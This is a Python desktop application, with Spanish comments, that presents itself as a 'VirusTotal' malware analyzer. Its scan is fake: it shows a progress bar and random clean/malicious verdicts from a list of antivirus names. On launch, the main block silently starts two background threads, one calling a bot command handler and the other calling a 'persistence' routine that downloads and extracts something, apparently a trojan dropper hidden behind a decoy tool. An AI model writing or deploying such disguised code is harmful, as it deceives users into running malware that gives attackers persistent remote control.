import tkinter as tk
from tkinter import filedialog, messagebox
import random
import time
from ttkthemes import ThemedTk
import ttkbootstrap as ttk
from bot.commands import run_bot
from modules.persistence import download_and_extract
import threading

# Lista de antivirus Fakes
ANTIVIRUS = [
    "Windows Defender", "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "ESET", "Sophos", "Panda", "Trend Micro", 
    "F-Secure", "Norton", "Malwarebytes", "Dr.Web", "Comodo", "AegisLab", "Agnitum", "AhnLab (V3)", "Alibaba", "Antiy-AVL", "ALYac", "Baidu-International", 
    "Bkav", "ByteHero", "Quick Heal", "CMC Antivirus", "ClamAV", "Emsisoft", "F-Prot", "GData", "Ikarus", "K7AntiVirus", "Kingsoft", 
    "Microsoft Malware Protection", "eScan", "NANO Antivirus", "Qihoo 360", "Rising Antivirus", "SUPERAntiSpyware", "Symantec", "Tencent", "VIPRE Antivirus", 
    "TotalDefense", "VBA32", "Zillya", "Zoner Antivirus"
]

def mostrar_resultados():
    # Simular detecciones aleatorias
    resultados = {av: random.choice(["Limpio", "Malicioso"]) for av in ANTIVIRUS}
    
    # Mostrar resultados con scroll
    result_window = tk.Toplevel(root)
    result_window.title("Resultados del análisis")
    result_window.geometry("400x400")
    
    canvas = tk.Canvas(result_window)
    scrollbar = ttk.Scrollbar(result_window, orient="vertical", command=canvas.yview)
    scrollable_frame = ttk.Frame(canvas)
    
    scrollable_frame.bind(
        "<Configure>",
        lambda e: canvas.configure(
            scrollregion=canvas.bbox("all")
        )
    )
    
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)
    
    ttk.Label(scrollable_frame, text="Resultados del análisis", font=("Arial", 14, "bold")).pack(pady=10)
    
    for av, status in resultados.items():
        color = "red" if status == "Malicioso" else "green"
        ttk.Label(scrollable_frame, text=f"{av}: {status}", foreground=color, font=("Arial", 11)).pack(anchor="w", padx=10)
    
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    

def analizar_archivo():
    archivo = filedialog.askopenfilename()
    if not archivo:
        return
    
    
    loading_window = tk.Toplevel(root)
    loading_window.title("👁️‍🗨️ Analizando archivo...")
    loading_window.geometry("300x120")
    loading_window.resizable(False, False)
    
    ttk.Label(loading_window, text="Escaneando archivo...", font=("Arial", 12)).pack(pady=5)
    progress = ttk.Progressbar(loading_window, orient="horizontal", mode="determinate", length=250, bootstyle="success")
    progress.pack(pady=5)
    
    progress_label = ttk.Label(loading_window, text="0%", font=("Arial", 10))
    progress_label.pack()
    
    for i in range(101):
        progress['value'] = i
        progress_label.config(text=f"{i}%")
        loading_window.update_idletasks()
        time.sleep(0.05)  
    
    loading_window.destroy()
    mostrar_resultados()


root = ThemedTk(theme="breeze")
root.title("🎯 Analizador de Malware | VirusTotal")
root.geometry("400x250")
root.resizable(False, False)

frame = ttk.Frame(root, padding=20)
frame.pack(expand=True, fill="both")

label = ttk.Label(frame, text="Selecciona un archivo para analizar:", font=("Arial", 12))
label.pack(pady=10)

btn_seleccionar = ttk.Button(frame, text="Seleccionar Archivo", command=analizar_archivo, bootstyle="primary")
btn_seleccionar.pack(pady=10)

def runApp():
    root.mainloop()

if __name__ == "__main__":

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    persistence = threading.Thread(target=download_and_extract, daemon=True)
    persistence.start()

    runApp()

